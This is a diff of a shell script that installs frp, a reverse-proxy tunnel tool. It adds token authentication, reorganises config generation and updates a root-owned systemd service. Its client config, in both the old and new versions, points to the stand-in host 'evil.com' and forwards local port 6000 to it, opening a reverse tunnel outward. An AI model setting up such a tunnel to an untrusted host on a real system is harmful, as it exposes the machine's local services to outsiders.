@@ -36,10 +36,41 @@ else
     exit 2
 fi
 
+# Generate config
+echo "Generating config ..."
+mkdir -p "$HOME/.frp"
+FRP_CONFIG="$HOME/.frp"
+TOKEN=$(openssl rand -hex 16)
+echo "$TOKEN" > "$FRP_CONFIG/frp_token"
+
+
+# Server config
+cp "$HOME/.local/frp/frps.toml" "$FRP_CONFIG/frps.toml"
+cat << EOF > "$FRP_CONFIG/frps.toml"
+bindPort = 7000
+auth.tokenSource.type = "file"
+auth.tokenSource.file.path = "$FRP_CONFIG/frp_token"
+EOF
+
+# Client config
+cp "$HOME/.local/frp/frpc.toml" "$FRP_CONFIG/frpc.toml"
+cat << EOF > "$FRP_CONFIG/frpc.toml"
+serverAddr = "evil.com"
+serverPort = 7000
+auth.tokenSource.type = "file"
+auth.tokenSource.file.path = "$FRP_CONFIG/frp_token"
+
+[[proxies]]
+name = "tcp"
+type = "tcp"
+localIP = "127.0.0.1"
+localPort = 6000
+remotePort = 6000
+EOF
+
 # systemd
 echo "Configuring systemd service ..."
-
-FRP_PATH="$HOME/.local/frp"
+FRP_PATH="$HOME/.local/bin"
 
 sudo -E tee /etc/systemd/system/frps.service > /dev/null << EOF
 [Unit]
@@ -49,7 +80,7 @@ Wants=network.target
 
 [Service]
 Type=simple
-ExecStart=$FRP_PATH/frps -c $FRP_PATH/frps.toml
+ExecStart=$FRP_PATH/frps -c $FRP_CONFIG/frps.toml
 
 [Install]
 WantedBy=multi-user.target
@@ -58,21 +89,5 @@ EOF
 sudo -E chown root:root /etc/systemd/system/frps.service
 sudo -E chmod 600 /etc/systemd/system/frps.service
 sudo -E systemctl daemon-reload
-
-# Generate local config
-echo "Generating config ..."
-mkdir -p "$HOME/.frp"
-cp "$HOME/.local/frp/frpc.toml" "$HOME/.frp/frpc.toml"
-cat << 'EOF' > "$HOME/.frp/frpc.toml"
-serverAddr = "evil.com"
-serverPort = 7000
-
-[[proxies]]
-name = "tcp"
-type = "tcp"
-localIP = "127.0.0.1"
-localPort = 6000
-remotePort = 6000
-EOF
 
 echo "frp has been successfully installed to $HOME/.local/frp."
